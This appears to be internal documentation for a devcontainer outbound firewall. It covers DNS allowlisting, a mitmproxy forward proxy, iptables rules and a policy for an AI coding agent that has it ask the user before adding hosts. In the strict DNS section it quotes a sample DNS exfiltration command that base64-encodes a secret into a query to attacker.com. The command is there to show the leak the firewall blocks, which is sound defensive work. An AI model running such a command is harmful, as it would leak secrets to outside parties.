# Firewall — internals & strict mode (force-proxy)

## Web search & research policy

The main devcontainer firewall is **strict by default** (Niveau 1 strict —
17-host Claude-only baseline). The three modes :

| Mode | DNS filtering | L7 (mitmproxy) inspection | Outbound to non-allowlisted host |
|---|---|---|---|
| `strict` (default) | ✅ enforced | ✅ enforced | blocked |
| `basic` (escape hatch) | ✅ enforced | ❌ off | blocked at DNS — still fails |
| `off` (kill-switch) | ❌ off | ❌ off | allowed |

**Key consequence** : even in `basic`, outbound to a host outside the
baseline fails because DNS resolution is filtered. `WebFetch` / `WebSearch`
against arbitrary hosts will silently fail in strict and basic alike.

### When a host is outside the baseline

When the user asks for :
- Up-to-date docs, web research, "explore X library", "read about Y"
- Reading sources outside the 17-host baseline
- Third-party API integration (POST to new hosts — Stripe, Linear, …)
- Package evaluation involving registries beyond the baseline

#### Step 0 — verify the host isn't already covered

**Before proposing *any* firewall path**, do this check :

1. **Find the REAL domain.** Marketing domains (`.com`) almost never
   match the tech / docs domains (`.io`, `.inc`, `.dev`). Sources, in
   priority order :
   - `.env.example` / `.env` for `*_BASE_URL`, `*_API_URL` env vars.
   - Service / client code (language-appropriate path — e.g.
     `src/services/*`, `app/Services/*`, `lib/clients/*`) for
     hardcoded URLs.
   - WebFetch the marketing homepage and grab the "Developers" / "Docs"
     footer link.
   - WebSearch as last resort (`"<vendor> developer documentation"`).

   Example : a vendor's tech domain is often a `.io` / `.dev` / `.inc`
   while marketing sits on `.com`. Always confirm the right one before
   adding.

2. **Grep the entire firewall config :**
   ```bash
   grep -riE "<root-domain>" .devcontainer/firewall/
   ```
   Check `domains.txt` (baseline with wildcards like `*.example.inc`),
   `domains.local.txt`, `addons/`, `policy.d/`, `policy.local.d/`.
   Wildcards count.

3. **If anything matched, skip the firewall ceremony entirely.** Just
   `WebFetch` directly. Don't add a redundant entry.

#### Step 1 — surface the constraint, AskUserQuestion with recommendation

If step 0 returned nothing, **don't `WebFetch` / `WebSearch` silently and
fail**. Use `AskUserQuestion` to present the two sanctioned paths with a
**recommended choice** :

1. **Targeted allowlist addition** — for **1–2 read-only domains,
   single-session lookup**. Append to `domains.local.txt` in a
   **dedicated marked section** so the cleanup is visible :

   ```
   # === TEMP <topic> — to remove before session end ===
   dev.example.inc
   docs.example.inc
   # === END TEMP <topic> ===
   ```

   Requires `Dev Containers: Rebuild Container` via the VS Code command
   palette. **Remind the user to delete the marked section at end of
   session** to keep `domains.local.txt` clean across reboots.

2. **A committed entry in `domains.d/<name>.txt`** — when the host is
   needed by the *project*, not by one person for one session. Committed,
   so colleagues get it too. Same syntax as `domains.txt`.

**Default to (1) `domains.local.txt`** with a marked TEMP section +
cleanup reminder, for almost any ad-hoc lookup — even when fetching
several pages of the same vendor's docs in the same session. Reach for
(2) only once the need is proven to be the project's and not yours.

Both require `Dev Containers: Rebuild Container` to take effect: the
allowlist is baked at build, not read at runtime.

**Substantial research** — a full third-party API evaluation, a
side-by-side comparison of 3+ vendors, anything POSTing real test data to
new hosts — deserves an **isolated devcontainer** with its own allowlist
and volumes rather than a widened main one. That is a deliberate,
operator-driven setup; do not widen the project allowlist to stand in for
it. Ask the user before going down either road.

### Adding a new dep to the project (composer / npm)

When the user wants to add a NEW package they haven't chosen yet, the
firewall work chains across three phases :

1. **Research / evaluation phase — pre-decision.** Compare candidates
   using the hosts already in the baseline where possible. For 1–2 known
   hosts you already trust, the targeted `domains.local.txt` route above
   is the cheapest path; a broad multi-vendor evaluation is worth an
   isolated devcontainer instead of widening this one.

2. **Install phase — after decision.** Add the package to
   `composer.json` / `package.json` and run `composer install` /
   `npm install`. The first attempt will likely hit firewall blocks if
   the new vendor/org isn't already in the lock — the `firewall-blocks`
   output makes the missing paths visible, and it is the authoritative
   list of what to allow.

3. **Persistence phase — commit the paths.** Add what `firewall-blocks`
   reported to `firewall/domains.d/<eco>.txt`, one host per line, same
   syntax as `domains.txt`. Rebuild Container to load them. Re-install
   confirms zero blocks.

**Anti-pattern** : do NOT leave the new package's paths in
`domains.local.txt` as a "permanent fix". That file is
personal/gitignored — your colleagues won't see those paths and their
install will break. The committed allowlist for project deps lives in
`domains.d/<eco>.txt`. The local layer is for dev-personal, single-host,
single-session ad-hoc reads.

---

## Firewall internals — pipeline compile

`init-firewall.sh` at boot invokes:

```
compile-policy.py --config-dir=/etc/devcontainer-firewall \
                  --out-dnsmasq=/var/run/devcontainer-firewall/dnsmasq-domains.conf \
                  --out-policy=/var/run/devcontainer-firewall/policy.compiled.yaml
```

Pipeline:
1. **Parse** `domains.txt` (Claude-only baseline, 17 hosts)
2. **Parse** `domains.d/*.txt` alphabetically (per-ecosystem; **F2**)
3. **Merge** same-host entries cross-file: methods union, paths concat
4. **Deep-merge** `policy.d/<host>.yaml` (top-level keys replace)
5. **Apply** `domains.local.txt`:
   - `!disable host` → delete from compiled output + log override
   - other line → **REDEFINE** host (wipe baseline paths, replace methods)
6. **Deep-merge** `policy.local.d/<host>.yaml`
7. **Emit atomically** (`.tmp` + `os.rename()`):
   - dnsmasq.conf — flat hosts (`server=/host/8.8.8.8` + `ipset=/host/allowed-domains`)
   - `policy.compiled.yaml` — schema `{defaults, domains, runtime}` consumed by mitmproxy addons

**`runtime._overrides_applied`** in compiled YAML is the machine-readable audit of every local override (action ∈ `{disable, disable-nop, redefine, merge}`).

### Strict DNS — no catch-all upstream

`dnsmasq.conf` (baked at `/etc/devcontainer-firewall/dnsmasq.conf`) has
**no default `server=` line**. Combined with `no-resolv` + `no-hosts`,
any query for a host not listed in the generated
`dnsmasq-domains.conf` returns `status: REFUSED` — the query is never
forwarded to Docker DNS / host DNS / public DNS. This closes the DNS
exfil channel (a `dig $(base64 secret).attacker.com @127.0.0.53` cannot
leak the encoded payload upstream).

Sibling Docker peers that still need to resolve are handled by
`init-firewall.sh` injecting per-host overrides into the generated conf:

- **claude-bridge** — unconditional override (`server=/claude-bridge/
  127.0.0.11`), since claude-bridge is always declared in docker-compose
  and always listed in baked `domains.txt`. Docker's embedded resolver
  (127.0.0.11) resolves the service from the compose graph.
- **host.docker.internal** — via the ollama block's `host-record=
  host.docker.internal,$HOST_DOCKER_IP` directive (resolved at boot
  through Docker's resolver, then injected with `local-ttl=3600`).
- **Generic loop over `direct-tcp-allow.txt`** — every other `host:port`
  entry gets a `server=/<host>/127.0.0.11` line emitted at boot, scaled
  by `claude-switch` for the active mode.

### compile-policy.py modes

- `--parse-only --json <files>` — emit `{entries, errors}` for tests (no yaml dependency)
- `--list-hosts <files>` — flat dedup after `!disable`; used by `init-firewall.sh` for probes + connectivity tests
- `--compile [--config-dir DIR]` — full pipeline; requires `yaml` module (installed in container via `python3-yaml` apt)

The two-mode split exists because the parser must run on the host without yaml installed (CI tests). Only `--compile` lazy-imports yaml and fails fast if absent.

## Firewall strict mode (force-proxy)

> Renamed from `paranoid` in A4 (deprecated alias still accepted). Pairs with `basic` (renamed from `okeish`) and `off` (unchanged).

### Architecture

`strict` mode runs mitmproxy as an **explicit forward HTTP proxy** on
`127.0.0.1:8080`. Apps reach it via `HTTPS_PROXY` env var. Apps that bypass
the proxy are blocked because the iptables filter chain only ACCEPTs outbound
from the `mitmproxy` UID :

```
iptables -A OUTPUT -m owner --uid-owner mitmproxy -m set --match-set allowed-domains dst -j ACCEPT
iptables -A OUTPUT -j REJECT --reject-with icmp-admin-prohibited
```

So the only paths to the internet are :
- **App → mitmproxy → external** (via HTTPS_PROXY ; mitmproxy resolves via dnsmasq, outbound gated by ipset)
- **App → `ports.txt` host** (direct, no UID restriction — *avoid in production*)

### Why force-proxy and not transparent REDIRECT

The original plan was **transparent mode** with `iptables -t nat REDIRECT --to-port 8080`
in OUTPUT chain. After many iterations this proved non-functional in Docker :

- `route_localnet=1` set on `all`/`lo`/`eth0` (per-interface required, `all` doesn't propagate)
- `accept_local=1` set on `lo`/`all`
- `MASQUERADE -o lo` to fix src-routing
- Counter showed 256 packets REDIRECT'd, but `mitmproxy.log` stayed empty

Root cause never fully isolated — likely a combination of Docker namespace quirks
+ kernel routing behavior with REDIRECT'd loopback packets. **Force-proxy was simpler
to implement, more robust, and gives a stronger guarantee** (apps that ignore the
proxy are *blocked*, not silently bypassed).

### HTTPS_PROXY propagation (3 layers)

Setting `HTTPS_PROXY` reliably for ALL processes (terminals, VS Code Server,
extensions, daemons) requires multiple paths because each process tree gets env
differently :

| Layer | Mechanism | Covers |
|---|---|---|
| 1 | `.env` (initialize.sh) → `docker-compose env_file:` | PID 1 + all `docker exec` children (incl. VS Code Server, extensions) |
| 2 | `/etc/environment` (init-firewall.sh) | PAM-based sessions (sudo, ssh-like, some daemons) |
| 3 | `/etc/profile.d/devcontainer-proxy.sh` (init-firewall.sh) | login shells (`bash -l`) |

`shell-init.sh` is *not* used for HTTPS_PROXY (env_file already covers terminals).
It still exports `REQUESTS_CA_BUNDLE`/`SSL_CERT_FILE`/`GIT_SSL_CAINFO` for tools
that don't read the system trust store.

### sysctls + Docker — pitfall

`docker-compose.yml` `sysctls:` accepts namespaced sysctls. **Per-interface
sysctls** (`net.ipv6.conf.eth0.disable_ipv6`) are rejected at the service level
for interfaces created by the netdriver — must use `networks.driver_opts.com.docker.network.endpoint.sysctls`
with `IFNAME` placeholder.

```yaml
services:
  app:
    sysctls:
      - net.ipv6.conf.all.disable_ipv6=1
      - net.ipv6.conf.lo.disable_ipv6=1   # 'lo' OK at service level
      # - net.ipv6.conf.eth0.disable_ipv6=1   # ❌ rejected by Docker

networks:
  default:
    driver_opts:
      com.docker.network.endpoint.sysctls: net.ipv6.conf.IFNAME.disable_ipv6=1
```

Setting `all` does NOT propagate to per-interface in Docker (contrary to bare
metal Linux). Always set `lo` + `default` + `IFNAME` explicitly.

### Diagnose

```bash
.devcontainer/tests/diagnose.sh                     # 125 PASS/FAIL checks
.devcontainer/tests/diagnose.sh <container> --verbose  # + state dumps
.devcontainer/tests/diag-a2.sh                      # mode-specific snapshot → tests/diag-a2-<mode>.log
```

Exit code 0 = all green, 1 = failures.

### Reset mitmproxy install (corrupted CA etc.)

```bash
docker volume rm mitmproxy-${DC_PROJECT}    # nuke CA (binary is baked in image since A3)
# Restart container → CA regenerated on next strict boot
```

The mitmproxy binary itself lives at `/opt/mitmproxy/` inside the image (baked
at build time, version pinned via `ARG MITM_VERSION` in the Dockerfile — see
Phase 3 A3 in the rollout log). The volume only holds the persistent CA cert.

### mitmproxy bundle: ruamel.yaml only, never PyYAML

The mitmproxy distribution we use (`mitmproxy-${MITM_VERSION}-linux-*.tar.gz`
from `downloads.mitmproxy.org`) is a **PyInstaller bundle** with its own
embedded Python interpreter (3.14 as of 12.2.3). The bundle ships:

- ✅ `ruamel.yaml` — used internally by mitmproxy for its config.
- ❌ `PyYAML` (`import yaml`) — NOT shipped, mitmproxy doesn't use it.

Any `--scripts` addon that does `import yaml` will crash at module-load with
`ModuleNotFoundError: No module named 'yaml'`, and mitmdump will exit before
binding port 8080. The official mitmproxy error message redirects to
"install mitmproxy from PyPI" — but doing that brings the runtime-pip venv
back, defeating the A3 image-bake.

**Pattern to use in `firewall/addons/*.py`:**

```python
from ruamel.yaml import YAML
_YAML = YAML(typ='safe')

with open(POLICY_PATH) as f:
    POLICY = _YAML.load(f) or {}
```

`YAML(typ='safe').load()` returns plain Python `dict` / `list` / scalars,
fully interchangeable with `yaml.safe_load()` for the schema we use in
`policy.compiled.yaml`. No external dependency, no venv, no extra image
weight — ruamel is already in the bundle because mitmproxy itself imports it.

**For `compile-policy.py`** (runs in container `python3`, not in the bundle):
keep `import yaml` — it has `python3-yaml` apt available and is faster /
simpler than ruamel for the bulk YAML dump it does. Only addons inside the
mitmproxy bundle need the swap.

**If you bump `MITM_VERSION`**, sanity-check the bundle still ships ruamel:

```bash
/opt/mitmproxy/mitmdump --scripts /tmp/probe.py --listen-port 18099 2>&1 | head
# where /tmp/probe.py is:
# from ruamel.yaml import YAML; print('ruamel ok')
```
